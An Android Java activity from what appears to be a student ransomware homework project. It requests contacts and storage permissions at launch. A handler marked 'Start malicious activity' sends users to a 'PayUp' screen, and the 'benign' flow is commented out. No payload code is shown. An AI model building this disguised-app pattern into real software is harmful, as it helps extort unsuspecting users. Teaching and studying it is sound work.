package wubbalubbadubdub.hw1700ransomware;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.text.TextUtils;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.Toast;

import java.util.List;

import wubbalubbadubdub.hw1700ransomware.data.DatabaseHelper;

/**
 * This is the starting activity for our application. Here the user will select or add users
 * @author Damian, Lane
 * @version 1.0
 */
public class SelectUserActivity extends Activity {
    private DatabaseHelper dbHelper;
    private Toast statusMessage;
    private ListView userList;

    /**
     * This function is called when the activity is first created
     * @param savedInstanceState Every oncreate needs this. Allows to revert to previous state
     * @since 1.0
     */
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_select_user);

        dbHelper = new DatabaseHelper(getApplicationContext());
        statusMessage = Toast.makeText(this, "", Toast.LENGTH_SHORT);

        userList = (ListView) findViewById(R.id.lvUsers);

        //Do permissions request on startup of the app
        int PERMISSION_ALL = 1;
        String[] PERMISSIONS = {
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
        };

        if(!hasPermissions(this, PERMISSIONS))
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);


        //Start malicious activity
        userList.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                String selectedUser = userList.getItemAtPosition(position).toString();

                Intent intent = new Intent(getApplicationContext(), PayUp.class);
                intent.putExtra("currentUser", selectedUser);
                startActivity(intent);
            }
        });

        //Start benign activity
        //        userList.setOnItemClickListener(new AdapterView.OnItemClickListener() {
//            @Override
//            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
//                String selectedUser = userList.getItemAtPosition(position).toString();
//
//                Intent intent = new Intent(getApplicationContext(), ListActivity.class);
//                intent.putExtra("currentUser", selectedUser);
//                startActivity(intent);
//            }
//        });
        populateUsers();
    }

    /**
     * This function utilizes the DatabaseHelper class to populate a listview with all users
     * in the database
     * @since 1.0
     */
    private void populateUsers() {
        List<String> users = dbHelper.getUsers();

        ArrayAdapter<String> arrayAdapter = new ArrayAdapter<String>(
                this,
                android.R.layout.simple_list_item_1,
                users );

        userList.setAdapter(arrayAdapter);
    }

    private boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null)
            for (String permission : permissions)
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED)
                    return false;
        return true;
    }

    /**
     * This function will utilize the DatabaseHelper to add a new user
     * @param v The View that fired the addUser() function. In this case it is the addUserButton
     * @since 1.0
     */
    public void addUser(View v) {
        EditText textbox = (EditText) findViewById(R.id.newUsername);
        String name = textbox.getText().toString().trim(); //removes any lead/trailing spaces as well


        if (isValidName(name)) statusMessage.setText(name + " was added to the list of users");
        statusMessage.show();
        populateUsers();
    }

    /**
     *
     * @param name the string to check the validity of
     * @return false if the name contains invalid characters
     * @since 1.0
     */
    private boolean isValidName(String name) {

        //Conditions for valid username creation
        if (TextUtils.isEmpty(name)){                    //Empty name
            statusMessage.setText("ERROR: Please input a name for the new user");
            return false;
        } else if (!name.matches("[a-zA-Z\\s]+")) {    //Non a-z characters in name
            statusMessage.setText("ERROR: Name contains invalid characters");
            return false;
        } else if (dbHelper.addUser(name) == -1) {       //name already exists
            statusMessage.setText("ERROR: That Username already exists!");
            return false;
        }else return true;
    }
}
